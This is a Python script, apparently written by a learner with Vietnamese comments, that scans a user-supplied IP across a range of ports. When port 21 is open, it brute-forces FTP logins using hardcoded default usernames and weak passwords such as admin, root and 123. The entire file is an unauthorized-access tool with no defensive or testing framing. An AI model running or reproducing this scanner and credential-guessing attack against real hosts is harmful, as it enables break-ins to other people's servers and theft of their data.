from ftplib import FTP
import socket
import threading

host = input("IP:")
Port = int(input("Port:"))
username = ['admin', 'user', 'root']
passwords = ['123', 'password', 'root']

def Port_scanner(host, port): ##khởi tạo socket kết nối tới port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((host, port))

        if result == 0:
           print(f" Port {port} Open")
           return True
    except:
        print("Timedout")
        return False 

def FTP_LOGIN_ATTEMPT(host, port, username, password): ## kết nối tới FTP của 
    try:
        ftp = FTP()
        ftp.connect(host, port, timeout=3) 
        ftp.login(username, password) ## thử kết nối với username và password chỉ định nếu đúng trả về true

        print(f"[+] Dang nhap thanh cong voi {username}:{password}")
        ftp.quit()
        return True
        
    except:
        print(f"[!] Dang nhap that bai voi {username}:{password}")
        return False

def PASSWD_CRACK(host, port, username, passwords): ## thử các tổ hợp username và password chỉ định
    for user in username:
        for password in passwords:
            if FTP_LOGIN_ATTEMPT(host, port, user, password):
                return 

def Port_Confirm(host, port): ## Xac nhan host mo port 21 
    if Port_scanner(host, port):
        if port == 21:
            print("[+] FTP FOUND, START BRUTE FORCE")
            PASSWD_CRACK(host, port, username, passwords)
        else:
            print(f" {host} Khong mo port 21")

def Loop_scan(host, Port):
    thread = []

    for port in range (1, Port + 1):
        t = threading.Thread(target = Port_Confirm, args = (host, port))
        t.start()
        thread.append(t)

    for t in thread:
        t.join()

Loop_scan(host, Port)
